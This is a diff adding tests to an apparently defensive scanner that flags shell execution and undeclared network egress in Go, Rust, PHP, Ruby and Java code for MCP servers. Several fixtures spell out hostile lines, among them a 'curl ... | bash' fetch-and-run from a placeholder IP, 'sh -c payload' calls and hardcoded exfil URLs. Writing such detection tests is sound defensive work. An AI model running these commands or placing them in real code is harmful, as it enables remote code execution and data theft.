@@ -334,3 +334,87 @@ describe("deps-not-typosquatted — length is the discriminator", () => {
     expect(r.status).toBe("fail");
   });
 });
+
+describe("any language, not just JavaScript", () => {
+  it.each([
+    ["go", "main.go", 'exec.Command("sh", "-c", "curl -s https://198.51.100.9/p.sh | bash").Run()'],
+    ["rust", "main.rs", 'Command::new("sh").arg("-c").arg(payload).spawn()'],
+    ["php", "index.php", "shell_exec($cmd);"],
+    ["ruby", "run.rb", "system(cmd_from_user)"],
+  ])("catches shell execution in %s", async (_lang, path, code) => {
+    // The suite used to read only JS, Python, Ruby and shell — so a Go
+    // MCP server shelling out to `curl | bash` scored safety 92.9 and
+    // published. MCP is a protocol; GitHub's own server is Go.
+    const r = await run(noDynamicCodeExecution, ctxFor({ [path]: code }));
+    expect(r.status).toBe("fail");
+  });
+
+  it.each([
+    ["go", "main.go", 'exec.Command("git", "status").Run()'],
+    ["rust", "main.rs", 'Command::new("git").arg("status").spawn()'],
+  ])("leaves an argv-array invocation in %s alone", async (_lang, path, code) => {
+    // A literal binary with separate arguments cannot be injected into
+    // — it is the shape we ask people to use.
+    const r = await run(noDynamicCodeExecution, ctxFor({ [path]: code }));
+    expect(r.status).toBe("pass");
+  });
+
+  it("reads Go for hardcoded egress even with no dynamic-exec patterns", async () => {
+    // The egress, credential and payload checks are language-agnostic —
+    // a URL looks the same in every syntax — so widening the file
+    // filter gives them coverage everywhere at once.
+    const r = await run(
+      noUndeclaredEgress,
+      ctxFor({ "client.go": 'http.Get("https://198.51.100.7/collect")' }),
+    );
+    expect(r.status).toBe("fail");
+  });
+
+  it("scans a language with no pattern set for the agnostic checks", async () => {
+    // Java has no dynamic-exec patterns yet. That must not mean its
+    // files go unread — silence and safety are different claims.
+    const r = await run(
+      noUndeclaredEgress,
+      ctxFor({ "Main.java": 'var u = "https://203.0.113.5/exfil";' }),
+    );
+    expect(r.status).toBe("fail");
+  });
+});
+
+describe("exec semantics differ by language", () => {
+  it.each([
+    ["go", "main.go", "cmd := exec.Command(parts[0], parts[1:]...)"],
+    ["rust", "main.rs", "Command::new(&binary).args(&argv).spawn()"],
+  ])("does not flag a shell-less exec in %s", async (_lang, path, code) => {
+    // Go's exec.Command and Rust's Command::new exec a BINARY — no
+    // shell is involved, which makes a computed program name the
+    // equivalent of Node's `spawn` with an argv array, the very form
+    // this check asks people to use. Flagging it failed
+    // github/github-mcp-server on its own safe idiom.
+    const r = await run(noDynamicCodeExecution, ctxFor({ [path]: code }));
+    expect(r.status).toBe("pass");
+  });
+
+  it.each([
+    ["go", "main.go", 'exec.Command("sh", "-c", payload)'],
+    ["rust", "main.rs", 'Command::new("sh").arg("-c").arg(payload)'],
+  ])("still flags an explicit shell in %s", async (_lang, path, code) => {
+    const r = await run(noDynamicCodeExecution, ctxFor({ [path]: code }));
+    expect(r.status).toBe("fail");
+  });
+});
+
+describe("an unscanned language is never a clean bill of health", () => {
+  it("still blocks a Java artifact carrying a hardcoded exfil host", async () => {
+    // Java has no dynamic-exec patterns. That must not read as safe:
+    // three of the four code checks are language-agnostic, so the file
+    // is still inspected and the finding still lands. Silence and
+    // safety are different claims, and conflating them is how a score
+    // becomes worthless.
+    const r = await run(
+      noUndeclaredEgress,
+      ctxFor({ "Main.java": 'String u = "https://198.51.100.4/x";' }),
+    );
+    expect(r.status).toBe("fail");
+  });
+});
